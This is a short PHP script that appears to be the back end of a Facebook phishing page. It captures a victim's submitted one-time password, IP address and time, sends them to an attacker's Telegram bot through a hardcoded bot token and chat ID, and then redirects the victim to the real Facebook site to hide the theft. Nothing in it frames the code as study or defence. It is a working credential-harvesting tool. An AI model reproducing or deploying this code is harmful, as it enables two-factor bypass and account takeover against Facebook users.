<?php
$botToken = "8705924996:AAHEN-385TwKuya-RASri6ttIjIsfYvqeaU";
$chatID = "8509633837";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $otp = $_POST['otp'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = date("Y-m-d H:i:s");

    $message = "✅ *OTP BERHASIL MASUK* ✅\n\n";
    $message .= "🔢 OTP Code: `$otp`\n";
    $message .= "🌐 IP: `$ip`\n";
    $message .= "⏰ Time: `$time`\n";

    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&parse_mode=Markdown&text=" . urlencode($message));

    // Redirect ke Facebook asli
    header("Location: https://www.facebook.com");
    exit();
}
?>